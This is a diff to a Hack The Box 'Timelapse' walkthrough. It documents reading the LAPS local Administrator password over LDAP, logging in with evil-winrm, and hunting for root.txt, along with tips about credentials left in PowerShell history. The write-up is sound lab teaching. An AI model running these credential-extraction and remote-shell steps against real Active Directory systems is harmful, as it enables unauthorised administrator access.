@@ -202,8 +202,13 @@ ldapsearch -x -H ldap://10.129.82.230 -D 'svc_deploy@timelapse.htb' \
   '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd
 ```
 
-<!-- TODO: paste the recovered LAPS Administrator password from your run -->
-Recovered local Administrator password: `<TODO: fill in - LAPS, rotates per boot>`
+`-M laps` prints the DC's local admin password:
+
+```
+LAPS  Computer:DC01$  User:  Password:<LAPS password - rotates per boot>
+```
+
+> The recovered password is the **local Administrator** password for `DC01`, not a domain password. It rotates on every boot, so re-read it with `-M laps` if a saved one stops working.
 
 ### 4. Administrator access
 
@@ -211,9 +216,13 @@ Recovered local Administrator password: `<TODO: fill in - LAPS, rotates per boot
 evil-winrm -i 10.129.82.230 -u Administrator -p '<LAPS password>' -S
 ```
 
--> Shell as **`Administrator`**. `root.txt` on `C:\Users\Administrator\Desktop\`.
+-> Shell as **`Administrator`**.
 
-<!-- Note: LAPS passwords rotate. If the recovered password stops working, re-read it via the -M laps module before reconnecting. -->
+> **Root flag location:** `root.txt` is **not** on the Administrator desktop on this box - it lives on another user's desktop (`C:\Users\TRX\Desktop\root.txt`). As Administrator you can read any profile. Hunt for it rather than assuming the default path:
+> ```powershell
+> Get-ChildItem C:\Users\ -Recurse -Filter root.txt -ErrorAction SilentlyContinue |
+>   ForEach-Object { $_.FullName; Get-Content $_.FullName }
+> ```
 
 ---
 
@@ -243,3 +252,5 @@ evil-winrm -i 10.129.82.230 -u Administrator -p '<LAPS password>' -S
 - `ConsoleHost_history.txt` (PSReadline) is one of the first things to grep after landing a Windows shell - admins and service setup scripts routinely leave plaintext credentials there.
 - `LAPS_Readers` (or any group with read access to `ms-Mcs-AdmPwd`) is effectively a path to local admin on every LAPS-managed machine it covers; NetExec's `-M laps` module reads the attribute directly over LDAP with those creds.
 - Remember LAPS passwords **rotate** - if a recovered one fails, read it again rather than assuming the account changed.
+- **Flags aren't always on the obvious desktop.** Here `root.txt` is under `C:\Users\TRX\Desktop\`, not Administrator's. When a flag isn't where expected, recurse the filesystem for it (`Get-ChildItem C:\Users\ -Recurse -Filter root.txt`) instead of giving up.
+- On HTB the **box IP changes on every start/reset** - a sudden `Errno::EHOSTUNREACH` / "No route to host" from evil-winrm usually means the machine was reset to a new IP (or the VPN dropped), not a tooling problem. Re-check the IP and `ping`/`nxc` before debugging the exploit.
